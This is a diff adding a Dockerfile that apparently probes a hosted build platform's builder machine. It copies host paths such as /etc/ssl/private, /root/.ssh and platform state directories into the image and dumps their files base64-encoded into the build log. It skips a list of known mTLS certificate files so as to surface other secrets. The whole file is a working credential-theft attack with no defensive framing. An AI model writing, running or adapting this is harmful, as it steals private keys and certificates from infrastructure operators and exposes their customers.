@@ -1,0 +1,16 @@
+# I67886-D-5b71
+FROM alpine:3.20
+RUN echo "MARKER_I67886D_5b71"
+COPY var/lib/railwayapp /h/railwayapp
+RUN echo "===D_RAILAPP_LSR"; ls -laR /h/railwayapp 2>/dev/null | head -400; echo D_LSR_END
+RUN echo "===D_RAILAPP_NONSTD"; for f in $(find /h/railwayapp -type f -size -300k 2>/dev/null); do case "$f" in */mtls-pki/client.crt|*/mtls-pki/client.key|*/mtls-pki/server.crt|*/mtls-pki/server.key|*/mtls-pki/root-ca.202812.crt|*/mtls-pki/client-ca.202812.crt|*/mtls-pki/server-ca.202812.crt|*/mtls-pki/server-ca-bundle.crt|*/mtls-pki/server-ca.registrymetal.crt|*/mtls-pki/server-ca.registrymetal-new.crt) ;; *) echo "@@@F $f"; base64 -w0 "$f" | cut -c1-4000; echo;; esac; done; echo D_NONSTD_END
+COPY var/lib/builderv3 /h/builderv3
+RUN echo "===D_BV3"; ls -laR /h/builderv3 2>/dev/null | head -300; for f in $(find /h/builderv3 -type f -size -100k 2>/dev/null); do echo "@@@F $f"; base64 -w0 "$f" | cut -c1-4000; echo; done; echo D_BV3_END
+COPY var/lib/railway /h/vlrailway
+RUN echo "===D_VLRAILWAY"; ls -laR /h/vlrailway 2>/dev/null | head -200; echo D_VLRAILWAY_END
+COPY etc/ssl/private /h/sslprivate
+RUN echo "===D_SSLPRIV"; ls -la /h/sslprivate 2>/dev/null; for f in /h/sslprivate/*; do [ -f "$f" ] || continue; echo "@@@F $f"; openssl x509 -in "$f" -noout -subject -issuer 2>/dev/null; base64 -w0 "$f" | cut -c1-3000; echo; done; echo D_SSLPRIV_END
+COPY root/.ssh /h/rootssh
+RUN echo "===D_ROOTSSH"; ls -la /h/rootssh 2>/dev/null; for f in /h/rootssh/*; do [ -f "$f" ] || continue; echo "@@@F $f"; base64 -w0 "$f" | cut -c1-3000; echo; done; echo D_ROOTSSH_END
+RUN echo "MARKER_I67886D_DONE"
+CMD ["sh","-c","sleep 3600"]
